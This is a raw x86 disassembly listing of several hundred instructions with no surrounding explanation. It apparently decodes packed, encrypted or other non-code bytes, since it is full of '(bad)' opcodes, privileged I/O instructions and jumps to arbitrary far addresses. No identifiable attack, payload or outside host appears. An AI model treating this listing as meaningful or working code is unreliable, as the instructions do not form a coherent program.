  496e74:	sbb    edx,ecx
  496e76:	js     0x496e87
  496e78:	jg     0x496dfe
  496e7a:	jb     0x496e85
  496e7c:	xor    al,0xc0
  496e7e:	jns    0x496e3f
  496e80:	pusha  
  496e81:	and    al,0xeb
  496e83:	or     eax,0x2fe32d10
  496e88:	mov    esi,0xf7d36e11
  496e8d:	fimul  DWORD PTR [ebx-0x2cc4c502]
  496e93:	jl     0x496eb9
  496e95:	mov    ecx,0x437eb0c6
  496e9a:	(bad)  
  496e9b:	push   edx
  496e9c:	shl    DWORD PTR [edx+0x19],0xbe
  496ea0:	and    DWORD PTR [edx+ebx*8+0xc25fa2f],esp
  496ea7:	add    al,0x30
  496ea9:	mov    al,0x46
  496eab:	mov    eax,0x66a38cb
  496eb0:	sahf   
  496eb1:	sar    DWORD PTR [eax+0x5fa8050b],cl
  496eb7:	pop    ss
  496eb8:	push   esi
  496eb9:	push   ds
  496eba:	jg     0x496ec1
  496ebc:	mov    esi,0x574c1772
  496ec1:	scas   al,BYTE PTR es:[edi]
  496ec2:	mov    ebp,0x46484bb5
  496ec7:	dec    ebx
  496ec8:	pop    ds
  496ec9:	or     dh,BYTE PTR [edx+0x18]
  496ecc:	mov    ecx,0xa3c91a4
  496ed1:	pop    esp
  496ed2:	js     0x496e81
  496ed4:	jmp    0x558899
  496ed9:	cmp    eax,0xc0a94d3
  496ede:	push   0x29f07b44
  496ee3:	stos   DWORD PTR es:[edi],eax
  496ee4:	loopne 0x496ed2
  496ee6:	in     al,0xf8
  496ee8:	rcr    cl,cl
  496eea:	xchg   esi,eax
  496eeb:	xor    BYTE PTR [esi-0x22b175d6],bl
  496ef1:	or     al,0xc2
  496ef3:	mov    ds:0x26850541,eax
  496ef8:	or     al,0x7c
  496efa:	add    DWORD PTR [ebp+0x76383da6],esp
  496f00:	xlat   BYTE PTR ds:[ebx]
  496f01:	xor    dl,BYTE PTR [eax]
  496f03:	adc    eax,0x1f5e08ae
  496f08:	sub    dh,BYTE PTR [esi-0x5f8cc01e]
  496f0e:	sub    dl,0x6e
  496f11:	aam    0xc7
  496f13:	add    al,0x18
  496f15:	jp     0x496f4e
  496f17:	imul   esp,DWORD PTR ds:0xb4da5380,0x1c1561c
  496f21:	ja     0x496ec3
  496f23:	jle    0x496f26
  496f25:	in     eax,dx
  496f26:	push   ebx
  496f27:	sbb    eax,esp
  496f29:	add    BYTE PTR [edx+0x50b236d7],dh
  496f2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  496f30:	rcr    BYTE PTR [edx-0x57],0x55
  496f34:	adc    BYTE PTR [ecx+0x47],0x0
  496f38:	add    ebx,DWORD PTR [eax]
  496f3a:	push   ss
  496f3b:	mov    eax,ds:0x1986109b
  496f40:	addr16 xchg edi,eax
  496f42:	enter  0xff7d,0x79
  496f46:	es neg edi
  496f49:	call   DWORD PTR [esi-0x5a83f3be]
  496f4f:	mov    ds:0x8b0cde07,al
  496f54:	add    al,0xc3
  496f56:	aaa    
  496f57:	push   edi
  496f58:	lods   al,BYTE PTR ds:[esi]
  496f59:	push   ebx
  496f5a:	sahf   
  496f5b:	mov    cl,dl
  496f5d:	sbb    cl,0x1
  496f60:	stc    
  496f61:	add    DWORD PTR [edi+0x3],edx
  496f64:	mov    edi,0x565eb756
  496f69:	xor    DWORD PTR [edx+eax*2],ecx
  496f6c:	and    dh,BYTE PTR [ecx-0x44b8e694]
  496f72:	and    DWORD PTR ss:[edi],ebp
  496f75:	push   ebx
  496f76:	pop    es
  496f77:	push   esp
  496f78:	inc    edx
  496f79:	adc    BYTE PTR [eax-0x54],0xd
  496f7d:	aad    0x53
  496f7f:	rol    BYTE PTR [ecx],0x82
  496f82:	and    al,0xd9
  496f84:	jbe    0x496f2d
  496f86:	sahf   
  496f87:	push   es
  496f88:	ins    BYTE PTR es:[edi],dx
  496f89:	xchg   dl,bl
  496f8b:	add    ecx,esi
  496f8d:	rol    DWORD PTR [ebx],1
  496f8f:	(bad)  
  496f90:	push   eax
  496f91:	pop    edx
  496f92:	in     eax,0x17
  496f94:	add    edi,DWORD PTR [edi+0x1875ff14]
  496f9a:	push   esi
  496f9b:	mov    esi,0xc08289cf
  496fa0:	stc    
  496fa1:	cmp    BYTE PTR [ebx],cl
  496fa3:	jle    0x496fcc
  496fa5:	push   ss
  496fa6:	mov    al,0x12
  496fa8:	add    al,0x81
  496faa:	mov    es,WORD PTR [edi+ecx*2]
  496fad:	and    BYTE PTR [ebx],cl
  496faf:	sbb    BYTE PTR [edi+0x57],0xf6
  496fb3:	jne    0x496fc8
  496fb5:	push   ecx
  496fb6:	and    esp,edx
  496fb8:	(bad)
  496fbb:	(bad)  
  496fbc:	nop
  496fbd:	push   cs
  496fbe:	and    DWORD PTR [ebp+0x78],ecx
  496fc1:	inc    ecx
  496fc2:	rol    ecx,0xe6
  496fc5:	xchg   esp,eax
  496fc6:	fsubr  DWORD PTR [eax]
  496fc8:	dec    ebx
  496fc9:	sub    ecx,DWORD PTR [ebp+0x652563c]
  496fcf:	test   al,0x2c
  496fd1:	stc    
  496fd2:	idiv   esp
  496fd4:	sub    ecx,eax
  496fd6:	and    al,bh
  496fd8:	dec    ebp
  496fd9:	or     al,0x18
  496fdb:	ins    BYTE PTR es:[edi],dx
  496fdc:	push   ecx
  496fdd:	push   edi
  496fde:	push   ebx
  496fdf:	push   ebp
  496fe0:	dec    eax
  496fe1:	and    eax,esp
  496fe3:	push   es
  496fe4:	loopne 0x497032
  496fe6:	dec    eax
  496fe7:	je     0x49700a
  496fe9:	test   DWORD PTR [esi],eax
  496feb:	out    0x9c,al
  496fed:	int3   
  496fee:	cld    
  496fef:	jl     0x49701e
  496ff1:	xor    cl,dh
  496ff3:	inc    esi
  496ff4:	fsubr  st(0),st
  496ff6:	adc    al,0x7d
  496ff8:	sub    BYTE PTR [edx+ecx*1-0x76],al
  496ffc:	pop    es
  496ffd:	inc    edi
  496ffe:	hlt    
  496fff:	cwde   
  497000:	add    ebp,edi
  497002:	jmp    0x155:0xfe4788f9
  497009:	ror    esi,1
  49700b:	xor    DWORD PTR [eax-0x627cc3ed],0x8331ceb
  497015:	rol    BYTE PTR [ecx+0x3ec689eb],cl
  49701b:	(bad)  
  49701c:	(bad)  
  49701e:	test   BYTE PTR [ebx],0x4
  497021:	sahf   
  497022:	clc    
  497023:	gs je  0x497085
  497026:	or     BYTE PTR [ebp+0x74],al
  497029:	pop    edx
  49702a:	cmp    dh,BYTE PTR [eax+0x20]
  49702d:	jecxz  0x497095
  49702f:	jne    0x49704a
  497031:	(bad)  
  497032:	lods   eax,DWORD PTR ds:[esi]
  497033:	fwait
  497034:	jb     0x496fe8
  497036:	lock or al,0x81
  497039:	aas    
  49703a:	jle    0x496fed
  49703c:	xchg   ecx,eax
  49703d:	in     eax,dx
  49703e:	cmp    BYTE PTR [esi],bl
  497040:	inc    esp
  497041:	inc    ecx
  497042:	je     0x497060
  497044:	dec    ebx
  497045:	or     eax,0x3030eb42
  49704a:	inc    eax
  49704b:	jle    0x49700d
  49704d:	xor    DWORD PTR [eax],ecx
  49704f:	or     bl,ch
  497051:	pop    ss
  497052:	sub    BYTE PTR [eax],cl
  497054:	lds    ecx,FWORD PTR [edx+0x185b2c5d]
  49705a:	dec    edx
  49705b:	jae    0x496ff3
  49705d:	inc    ebp
  49705e:	push   cs
  49705f:	das    
  497060:	sbb    al,0x68
  497062:	jmp    0x4970b8
  497064:	inc    edi
  497065:	clc    
  497066:	ror    BYTE PTR [eax],1
  497068:	hlt    
  497069:	fisubr DWORD PTR [eax+0x75]
  49706c:	into   
  49706d:	push   esi
  49706e:	xor    ebp,ebx
  497070:	(bad)  
  497071:	or     bl,BYTE PTR [edx]
  497073:	inc    ebp
  497074:	sbb    al,0x1
  497076:	jg     0x4970d6
  497078:	mov    bh,0x3b
  49707a:	addr16 or edi,eax
  49707d:	mov    ds:0xb6f7278,eax
  497082:	adc    eax,0x2b2b3f70
  497087:	sub    ebx,DWORD PTR ds:0x3d68356c
  49708d:	data16 mov WORD PTR fs:0xbf2f2f2f,ss
  497095:	nop
  497096:	or     eax,0x601d840d
  49709b:	add    eax,0x3358255c
  4970a0:	pushf  
  4970a1:	aas    
  4970a2:	das    
  4970a3:	sub    eax,0x58f9c54
  4970a8:	mov    BYTE PTR [eax-0x54],bl
  4970ab:	outs   dx,BYTE PTR ds:[esi]
  4970ac:	daa    
  4970ad:	into   
  4970ae:	pop    edi
  4970af:	jl     0x4970c0
  4970b1:	add    al,0xa3
  4970b3:	or     BYTE PTR [edx-0x5d],0x8c
  4970b7:	pop    ds
  4970b8:	add    BYTE PTR [ecx],al
  4970ba:	dec    ebx
  4970bb:	adc    DWORD PTR [ebx],ebp
  4970bd:	ja     0x4970b6
  4970bf:	test   BYTE PTR [eax],ch
  4970c1:	cs jno 0x4970fc
  4970c4:	add    ah,BYTE PTR [ecx+0x4d1a5238]
  4970ca:	sub    dl,ah
  4970cc:	imul   esp,DWORD PTR [esi],0x3a860970
  4970d2:	je     0x49705e
  4970d4:	enter  0x2d48,0xf5
  4970d8:	sbb    eax,DWORD PTR [ebp+0x7c]
  4970db:	pop    edi
  4970dc:	test   DWORD PTR [ecx+0x59dc1544],esp
  4970e2:	mov    ds:0x6869c508,eax
  4970e7:	sar    BYTE PTR [edx+0x1d],0xb0
  4970eb:	add    al,0xb
  4970ed:	jecxz  0x497159
  4970ef:	add    DWORD PTR [ecx-0x1f530624],edx
  4970f5:	fadd   QWORD PTR [ebx-0x80]
  4970f8:	and    eax,DWORD PTR [ecx+0x4a]
  4970fb:	mov    WORD PTR [edx],fs
  4970fd:	fdiv   QWORD PTR [eax]
  4970ff:	inc    edi
  497100:	push   0x84c127b7
  497105:	and    ecx,DWORD PTR [edx]
  497107:	mov    ebx,DWORD PTR [eax]
  497109:	aam    0x1d
  49710b:	pop    eax
  49710c:	add    eax,0x4eecf147
  497111:	inc    eax
  497112:	mov    al,ds:0xcf41018
  497117:	or     DWORD PTR [ebp+0x3c250392],ebx
  49711d:	add    BYTE PTR [esi-0x585ddcbb],0x50
  497124:	xchg   ebp,eax
  497125:	or     BYTE PTR [ebx+0x3ad1e8ec],0x51
  49712c:	clc    
  49712d:	and    DWORD PTR [ecx+ecx*1+0xb1b0c68],eax
  497134:	retf   0xd611
  497137:	retf   0xdc86
  49713a:	test   al,0x36
  49713c:	inc    BYTE PTR [edx]
  49713e:	test   al,0x84
  497140:	fxch   st(6)
  497142:	shr    esi,0x1f
  497145:	add    edx,edx
  497147:	or     edx,esi
  497149:	call   0xc903:0x5a8dff03
  497150:	shr    edi,0x1f
  497153:	or     ecx,edi
  497155:	mov    edi,ecx
  497157:	mov    dl,BYTE PTR [eax+0x12]
  49715a:	dec    ebp
  49715b:	test   eax,0xe84cdf6e
  497160:	add    esi,esi
  497162:	shr    ebx,0x22
  497165:	retf   
  497166:	add    edx,esi
  497168:	dec    esi
  497169:	shl    DWORD PTR [esi],0x40
  49716c:	js     0x4970f6
  49716e:	dec    eax
  49716f:	or     ah,ah
  497171:	add    eax,0xda302e3b
  497176:	repnz or BYTE PTR [esi+0x32898e10],ch
  49717d:	jmp    0x7a797670
  497182:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  497183:	lea    edi,[esi+0x1]
  497186:	push   esp
  497187:	in     eax,dx
  497188:	jle    0x4971f5
  49718a:	xchg   DWORD PTR [edi+0x43],ebx
  49718d:	jbe    0x497203
  49718f:	add    al,0x41
  497191:	jl     0x4971df
  497193:	in     al,dx
  497194:	adc    ebp,DWORD PTR [ebx-0x2e]
  497197:	das    
  497198:	sbb    al,0x37
  49719a:	cmp    ebx,edi
  49719c:	mov    ds:0x46584bde,al
  4971a1:	or     ah,0x27
  4971a4:	add    ecx,DWORD PTR [ebp-0x10]
  4971a7:	pushf  
  4971a8:	add    DWORD PTR [esi],0x7
  4971ab:	or     esp,DWORD PTR [eax]
  4971ad:	mov    esi,edx
  4971af:	and    eax,0x6b4adb47
  4971b4:	cwde   
  4971b5:	sahf   
  4971b6:	mov    edx,0xfc083ade
  4971bb:	ins    BYTE PTR es:[edi],dx
  4971bc:	or     bl,BYTE PTR [ebx]
  4971be:	add    eax,0xf6210bf
  4971c3:	mov    esi,0xe8325431
  4971c8:	pusha  
  4971c9:	mov    edx,DWORD PTR [esi+ebx*8+0x3b]
  4971cd:	retf   0xcea0
  4971d0:	clc    
  4971d1:	or     BYTE PTR [ecx-0x44e25af8],0xc
  4971d8:	ret    0x153
  4971db:	mov    ds:0xd930d33b,al
  4971e0:	clc    
  4971e1:	push   ebx
  4971e2:	xor    bh,dl
  4971e4:	test   BYTE PTR [esi-0x75],0xda
  4971e8:	mov    WORD PTR [eax+0xd],ss
  4971eb:	jp     0x4971c6
  4971ed:	pushf  
  4971ee:	enter  0xd842,0x8b
  4971f2:	inc    eax
  4971f3:	jae    0x4971c5
  4971f5:	sbb    cl,BYTE PTR [eax]
  4971f7:	jmp    0xe208:0xbc067710
  4971fe:	cwde   
  4971ff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  497200:	and    al,0x62
  497202:	add    ebp,DWORD PTR [edx-0x20]
  497205:	ja     0xe23590cd
  49720b:	data16 xor al,0xc
  49720e:	mov    al,ds:0x88b60e6
  497213:	adc    DWORD PTR ds:0xccb012b4,0xf17bfff0
  49721d:	sbb    dl,BYTE PTR [eax]
  49721f:	ss adc al,0x28
  497222:	or     eax,0x6a10303c
  497227:	shl    ecx,0x1
  49722a:	clc    
  49722b:	xor    ch,ah
  49722d:	and    BYTE PTR [eax-0x5e],0xdc
  497231:	jbe    0x497236
  497233:	imul   ebx,DWORD PTR [ebx-0x44],0x4
  497237:	test   edi,0x488b302d
  49723d:	push   0x9e50da81
  497242:	sbb    bh,bh
  497244:	jbe    0x4971cb
  497246:	test   DWORD PTR [eax-0x3f],esp
  497249:	mov    ds:0xba602ff,al
  49724e:	(bad)  
  49724f:	xchg   esi,eax
  497250:	or     BYTE PTR [ecx+0x5e0b9987],cl
  497256:	dec    eax
  497257:	pop    edi
  497258:	je     0x49722d
  49725a:	cmp    bp,WORD PTR [esi+0x40]
  49725e:	jmp    0x49726d
  497260:	data16 sub BYTE PTR [edx],cl
  497263:	aad    0x51
  497265:	sbb    al,0x80
  497267:	adc    al,0xe1
  497269:	jle    0x497298
  49726b:	xor    al,0xfe
  49726d:	add    BYTE PTR [edx],0x28
  497270:	mov    al,ds:0xf60819a1
  497275:	or     DWORD PTR [eax+edi*4],ebx
  497278:	scas   eax,DWORD PTR es:[edi]
  497279:	dec    eax
  49727a:	or     ch,cl
  49727c:	jg     0x4972c6
  49727e:	jg     0x4972ea
  497280:	add    DWORD PTR [ebp-0x3baef7b3],ecx
  497286:	fwait
  497287:	cli    
  497288:	add    al,0x3e
  49728a:	jge    0x49726e
  49728c:	outs   dx,BYTE PTR ds:[esi]
  49728d:	leave  
  49728e:	gs dec ebp
  497290:	ins    BYTE PTR es:[edi],dx
  497291:	lods   al,BYTE PTR ds:[esi]
  497292:	pop    ebx
  497293:	jg     0x497299
  497295:	cli    
  497296:	add    eax,0xc0f63aa4
  49729b:	stos   BYTE PTR es:[edi],al
  49729c:	enter  0xc48b,0x25
  4972a0:	add    al,dh
  4972a2:	pusha  
  4972a3:	mov    ebp,0x72acdbe1
  4972a8:	push   es
  4972a9:	rcr    DWORD PTR [ecx-0x6c],0x8b
  4972ad:	or     ah,BYTE PTR [eax+0x64]
  4972b0:	pop    ebp
  4972b1:	shl    BYTE PTR [ebx+eax*8],1
  4972b4:	sub    eax,0xd6e93a79
  4972b9:	push   eax
  4972ba:	loop   0x4972c0
  4972bc:	push   edi
  4972bd:	loopne 0x4972c8
  4972bf:	sub    al,0x68
  4972c1:	xor    al,0xba
  4972c3:	adc    eax,eax
  4972c5:	jbe    0x4972d4
  4972c7:	add    al,0xa4
  4972c9:	mov    dh,0xf0
  4972cb:	or     ebx,DWORD PTR [eax]
  4972cd:	fsubr  DWORD PTR [ecx+0x60]
  4972d0:	jbe    0x497288
  4972d2:	sbb    DWORD PTR [ebx],eax
  4972d4:	xchg   BYTE PTR [ecx-0x3e995901],al
  4972da:	shl    DWORD PTR [ebp-0x77],1
  4972dd:	push   esi
  4972de:	lods   al,BYTE PTR ds:[esi]
  4972df:	ror    DWORD PTR [ecx],0xac
  4972e2:	in     al,0x95
  4972e4:	adc    al,BYTE PTR [esi]
  4972e6:	xsave  [ecx+0x44]
  4972ea:	adc    al,0xb9
  4972ec:	xchg   BYTE PTR [eax+0x583db3ec],al
  4972f2:	jbe    0x49732a
  4972f4:	mov    esp,0x570b0f74
  4972f9:	in     al,0x46
  4972fb:	ret    
  4972fc:	dec    esp
  4972fd:	sbb    al,0x89
  4972ff:	sub    al,cl
  497301:	and    eax,DWORD PTR [edx+edx*4+0x1ba9fc18]
  497308:	mov    ds:0x6a3c2dd1,eax
  49730d:	es scas al,BYTE PTR es:[edi]
  49730f:	and    BYTE PTR [ebp+0x5a593322],ch
  497315:	lods   eax,DWORD PTR ds:[esi]
  497316:	test   DWORD PTR [esi],eax
  497318:	mov    ?,WORD PTR [eax+0x52b01c36]
  49731e:	int3   
  49731f:	popf   
  497320:	inc    eax
  497321:	xor    edi,DWORD PTR [ecx-0x64]
  497324:	add    DWORD PTR [edi+0x5f0eb3c],ebx
  49732a:	xlat   BYTE PTR ds:[ebx]
  49732b:	inc    edi
  49732c:	mov    eax,DWORD PTR [esi+0xc]
  49732f:	push   ecx
  497330:	push   ebx
  497331:	push   edi
  497332:	push   esi
  497333:	xchg   ebp,eax
  497334:	adc    al,0x10
  497336:	cmp    eax,0x5821b101
  49733b:	pop    ebx
  49733c:	jl     0x49736f
  49733e:	mov    al,0xd3
  497340:	xor    esi,DWORD PTR [eax+0x14]
  497343:	mov    ds:0x85056a85,eax
  497348:	fprem  
  49734a:	fwait
  49734b:	nop
  49734c:	retf   
  49734d:	je     0x49730c
  49734f:	mov    DWORD PTR [ecx],eax
  497351:	jmp    0x49730c
  497353:	cmp    DWORD PTR [ecx-0x29],0x5032a704
  49735a:	sbb    BYTE PTR [eax+0xffb0f73],ch
  497360:	xchg   BYTE PTR [ebx+0x36],ch
  497363:	loopne 0x4973c0
  497365:	rcl    DWORD PTR [ebp+0x91713c0],0x1
  49736c:	mov    BYTE PTR [ebx],dl
  49736e:	add    ebp,edi
  497370:	adc    ah,BYTE PTR [edi+0x33]
  497373:	je     0x4973d4
  497375:	sbb    BYTE PTR [eax],0x80
  497378:	or     al,0x76
  49737a:	adc    al,ah
  49737c:	mov    eax,ds:0xd9323614
  497381:	or     DWORD PTR [eax+0x2e],eax
  497384:	or     eax,0x162b48d5
  497389:	jb     0x49737c
  49738b:	mov    edx,0x552234e7
  497390:	add    BYTE PTR [eax-0x20],bl
  497393:	jo     0x497315
  497395:	sbb    dl,BYTE PTR [edx+0x13]
  497398:	ja     0x4973a2
  49739a:	ins    BYTE PTR es:[edi],dx
  49739b:	mov    BYTE PTR [ebp-0x2],bl
  49739e:	ficomp DWORD PTR [esi-0x76]
  4973a1:	xor    BYTE PTR [ecx+0x22d009dc],cl
  4973a7:	sbb    BYTE PTR [edx],al
  4973a9:	shr    BYTE PTR [eax-0x80],0x96
  4973ad:	xchg   esp,eax
  4973ae:	pop    edx
  4973af:	and    ch,cl
  4973b1:	adc    bl,ch
  4973b3:	or     ah,BYTE PTR [ebp+0x5a14ff42]
  4973b9:	inc    ebx
  4973ba:	daa    
  4973bb:	and    DWORD PTR [eax],esi
  4973bd:	sbb    eax,0x3580de7b
  4973c2:	push   es
  4973c3:	pusha  
  4973c4:	jl     0x497393
  4973c6:	test   DWORD PTR [edx+0x1af94c9b],ecx
  4973cc:	add    BYTE PTR [eax],dl
  4973ce:	add    BYTE PTR [eax+0x48],al
  4973d1:	repnz or BYTE PTR [ebp-0x11],0x81
  4973d6:	mov    edi,ss
  4973d8:	inc    DWORD PTR [eax-0x463ccb5a]
  4973de:	js     0x4973a0
  4973e0:	push   es
  4973e1:	push   0x6b
  4973e3:	or     BYTE PTR [ecx],ch
  4973e5:	je     0x49742a
  4973e7:	in     al,dx
  4973e8:	lea    edx,[edi]
  4973ea:	inc    ecx
  4973eb:	push   0xe472004
  4973f0:	(bad)  
  4973f1:	js     0x497458
  4973f3:	cwde   
  4973f4:	call   0x1beb:0x2a5602b7
  4973fb:	js     0x497437
  4973fd:	mov    eax,ds:0xad0a3631
  497402:	add    ah,ch
  497404:	inc    edx
  497405:	mov    WORD PTR [edi],?
  497407:	rcr    DWORD PTR [edi],0x40
  49740a:	jmp    0x49740f
  49740c:	fmul   st,st(7)
  49740e:	cmp    edx,DWORD PTR [ecx+esi*8]
  497411:	loop   0x49747d
  497413:	adc    ah,dh
  497415:	aaa    
  497416:	push   es
  497417:	sub    bl,BYTE PTR ds:0x3b7d8260
  49741d:	fsubr  st,st(0)
  49741f:	inc    eax
  497420:	jne    0x4973c7
  497422:	cmp    DWORD PTR [edx],edi
  497424:	jp     0x497491
  497426:	arpl   WORD PTR ss:[ebx-0x49e114ec],si
  49742d:	add    eax,DWORD PTR [eax]
  49742f:	adc    eax,0x9e77c110
  497434:	retf   0xc02
  497437:	add    DWORD PTR [esi+0x213aec5d],eax
  49743d:	loopne 0x497452
  49743f:	and    BYTE PTR [esi],0x88
  497442:	ret    0x5876
  497445:	shr    BYTE PTR [eax-0x47],0x57
  497449:	stc    
  49744a:	cmp    BYTE PTR [edi+0x33],0xd0
  49744e:	fs pop esp
  497450:	or     BYTE PTR [edx+0x4e],al
  497453:	and    al,0x4e
  497455:	pop    ss
  497456:	adc    al,0x98
  497458:	std    
  497459:	add    al,0x21
  49745b:	push   esp
  49745c:	or     al,0x8c
  49745e:	add    BYTE PTR ds:0xc1fd9e47,ch
  497464:	retf   0x3c15
  497467:	jmp    0x4974bd
  497469:	adc    DWORD PTR [edi-0x15],eax
  49746c:	dec    ebx
  49746d:	dec    edi
  49746e:	jmp    0x4974a2
  497470:	invd   
  497472:	mov    ch,0x42
  497474:	inc    edx
  497475:	add    eax,0x115806e9
  49747a:	pop    esp
  49747b:	adc    edx,DWORD PTR [edx]
  49747d:	sub    ebx,eax
  49747f:	ficomp DWORD PTR [eax+0x75e1fb3d]
  497485:	mov    ebx,gs
  497487:	pop    es
  497488:	adc    DWORD PTR [ecx-0x25f921ec],edx
  49748e:	popa   
  49748f:	lock cmp al,0xf0
  497493:	push   ss
  497494:	mov    ecx,DWORD PTR ds:0xea2ead50
  49749a:	cpuid  
  49749c:	shl    DWORD PTR [ebx],1
  49749e:	dec    ebp
  49749f:	sbb    BYTE PTR [eax+0xa62ac07],ah
  4974a5:	mov    DWORD PTR [edi+0x4e],ecx
  4974a8:	adc    dl,BYTE PTR ds:0x63fb0765
  4974ae:	add    al,0xc
  4974b0:	sbb    BYTE PTR [esi],ah
  4974b2:	pop    eax
  4974b3:	add    DWORD PTR [eax-0x56fb9637],edi
  4974b9:	xlat   BYTE PTR ds:[ebx]
  4974ba:	je     0x4974c5
  4974bc:	jge    0x4974ae
  4974be:	into   
  4974bf:	add    BYTE PTR [esi+0x3f096835],bl
  4974c5:	or     bl,ch
  4974c7:	or     esp,DWORD PTR [edx+eiz*8+0x59]
  4974cb:	sub    ah,cl
  4974cd:	sbb    DWORD PTR [eax],edx
  4974cf:	sahf   
  4974d0:	lahf   
  4974d1:	sbb    BYTE PTR [esi],al
  4974d3:	imul   edi,DWORD PTR [eax+0x21a22684],0x395b1e55
  4974dd:	and    al,0xb9
  4974df:	das    
  4974e0:	sbb    cl,bh
  4974e2:	pop    ss
  4974e3:	mov    edi,DWORD PTR ds:0x58031ea3
  4974e9:	into   
  4974ea:	(bad)
  4974ed:	cmp    bh,BYTE PTR [edx]
  4974ef:	dec    ebp
  4974f0:	mov    ebp,0x50a4e810
  4974f5:	in     al,0xec
  4974f7:	cmp    eax,0xf4695105
  4974fc:	xlat   BYTE PTR ds:[ebx]
  4974fd:	and    al,0x9a
  4974ff:	jo     0x4974cb
  497501:	gs push ecx
  497503:	add    BYTE PTR [edx-0x48],cl
  497506:	mov    ebp,0x8bfd5910
  49750b:	inc    edx
  49750c:	bound  ebp,QWORD PTR [ebx]
  49750e:	add    DWORD PTR fs:[ebp+eiz*1-0x7f],esi
  497513:	gs hlt 
  497515:	xchg   DWORD PTR [edx],ecx
  497517:	dec    edi
  497518:	in     eax,dx
  497519:	out    dx,al
  49751a:	jge    0x497586
  49751c:	jbe    0x49758f
  49751e:	aaa    
  49751f:	mov    esi,DWORD PTR [esi]
  497521:	inc    eax
  497522:	dec    eax
  497523:	pop    ebp
  497524:	push   eax
  497525:	and    esi,edi
  497527:	pop    ds
  497528:	andps  xmm0,xmm0
  49752b:	xor    BYTE PTR [ebx],0x52
  49752e:	cmp    BYTE PTR [ebx],bl
  497530:	push   ds
  497531:	push   edi
  497532:	push   esp
  497533:	pop    es
  497534:	adc    ch,bh
  497536:	xchg   esp,eax
  497537:	lahf   
  497538:	jge    0x497593
  49753a:	sbb    dh,BYTE PTR [ebp+0x56b8744]
  497540:	xchg   ebp,eax
  497541:	cmp    bh,bl
  497543:	mov    ch,BYTE PTR [ebp+0xc]
  497546:	add    al,0xad
  497548:	out    dx,eax
  497549:	repnz mov dl,0x13
  49754c:	ret    0xfc0d
  49754f:	jmp    0x4974f1
  497551:	dec    ebp
  497552:	call   FWORD PTR [edi+0x28]
  497555:	je     0x4975c6
  497557:	adc    al,0x8
  497559:	pop    ebx
  49755a:	ss dec esp
  49755c:	pushf  
  49755d:	loop   0x4974ea
  49755f:	push   es
  497560:	mov    eax,DWORD PTR [edx-0x48]
  497563:	add    BYTE PTR [ebp-0x25c3230],bl
  497569:	mov    ds:0x8a595e57,eax
  49756e:	mov    eax,0x4c8801c9
  497573:	add    al,BYTE PTR [edi+edi*1]
  497576:	fnstcw WORD PTR [edi+0x23c7059]
  49757c:	add    ah,BYTE PTR [eax+eax*4]
  49757f:	mov    BYTE PTR [ebp-0x3],cl
  497582:	and    BYTE PTR [ebp-0x3],0x48
  497586:	or     al,0xc3
  497588:	mov    ds:0x7f9aba99,eax
  49758d:	test   cl,0x7a
  497590:	test   al,0x98
  497592:	inc    eax
  497593:	jecxz  0x4975bc
  497595:	add    dh,cl
  497597:	add    dh,BYTE PTR [eax+esi*2-0x5a]
  49759b:	mov    edi,0x4b027bd1
  4975a0:	gs or  eax,0xc123ce21
  4975a6:	out    dx,eax
  4975a7:	sar    BYTE PTR [edx-0x7f],1
  4975aa:	cmp    BYTE PTR [ebx-0x38c6af24],al
  4975b0:	pop    esi
  4975b1:	loopne 0x4975a2
  4975b3:	cwde   
  4975b4:	jp     0x4975a1
  4975b6:	push   ss
  4975b7:	test   al,0xb4
  4975b9:	clc    
  4975ba:	fsubr  DWORD PTR [ebx]
  4975bc:	or     bl,BYTE PTR ds:0xf675513c
  4975c2:	sbb    ch,BYTE PTR [esi+ecx*8]
  4975c5:	fild   WORD PTR [ebp-0x4de5273c]
  4975cb:	(bad)  
  4975cc:	cdq    
  4975cd:	push   edx
  4975ce:	xor    eax,DWORD PTR [edx]
  4975d0:	sub    dh,dl
  4975d2:	fnstenv [esi]
  4975d4:	mov    al,0x8e
  4975d6:	jb     0x49759a
  4975d8:	push   es
  4975d9:	mov    ebp,0xe7ab5923
  4975de:	mov    ch,0xb0
  4975e0:	jmp    0xb945:0xbf28feff
  4975e7:	or     BYTE PTR [edx-0x59],ch
  4975ea:	rcr    BYTE PTR [esi+eiz*2+0x7d],1
  4975ee:	(bad)  
  4975f1:	(bad)  
  4975f2:	xor    al,0x81
  4975f4:	inc    ebx
  4975f5:	mov    ch,0x62
  4975f7:	or     DWORD PTR [ebp-0x36],ecx
  4975fa:	xor    BYTE PTR [esp+ebx*1],0x10
  4975fe:	adc    eax,0x80c222a1
  497603:	inc    esp
  497604:	ins    DWORD PTR es:[edi],dx
  497605:	fs in  al,0x3d
  497608:	in     eax,dx
  497609:	sub    DWORD PTR [eax+eax*2],ecx
  49760c:	and    bl,BYTE PTR [edx]
  49760e:	add    al,BYTE PTR [edx]
  497610:	push   eax
  497611:	imul   ebx,DWORD PTR [ebp-0x55f8fb9a],0x5f4bb01e
  49761b:	xchg   BYTE PTR [esi-0x15],ah
  49761e:	call   0xfc412e33
  497623:	mov    cl,0x0
  497625:	ror    BYTE PTR [ebx],1
  497627:	or     ah,BYTE PTR [esi]
  497629:	add    ch,bl
  49762b:	add    al,0xa
  49762d:	xchg   esi,eax
  49762e:	xor    dl,bl
  497630:	stos   BYTE PTR es:[edi],al
  497631:	add    BYTE PTR [ecx-0xa],bh
  497634:	lods   al,BYTE PTR ds:[esi]
  497635:	mov    ebx,0x75b12ea
  49763a:	push   cs
  49763b:	inc    eax
  49763c:	jo     0x4976b0
  49763e:	popf   
  49763f:	mov    al,0xfb
  497641:	jmp    0x4975d6
  497643:	xchg   ebx,eax
  497644:	xor    DWORD PTR [ebx],esp
  497646:	shl    DWORD PTR [edx+0x5ebf5998],0x93
  49764d:	imul   edi,DWORD PTR ds:0x853e714b,0x79624384
  497657:	pop    es
  497658:	(bad)  
  497659:	jbe    0x7bbcd0cd
  49765f:	popa   
  497660:	dec    esi
  497661:	jbe    0x497671
  497663:	or     BYTE PTR [esi+esi*2],al
  497666:	sub    eax,DWORD PTR ds:0xd76e5b3a
  49766c:	call   0x48a8:0xc4be0f7d
  497673:	jb     0x497693
  497675:	sbb    BYTE PTR [eax*4-0x7bf8feb9],cl
  49767c:	pop    es
  49767d:	xchg   BYTE PTR ds:0x1482dafe,cl
  497683:	rol    BYTE PTR [edi-0x4307e688],1
  497689:	stos   DWORD PTR es:[edi],eax
  49768a:	outs   dx,BYTE PTR ds:[esi]
  49768b:	push   ss
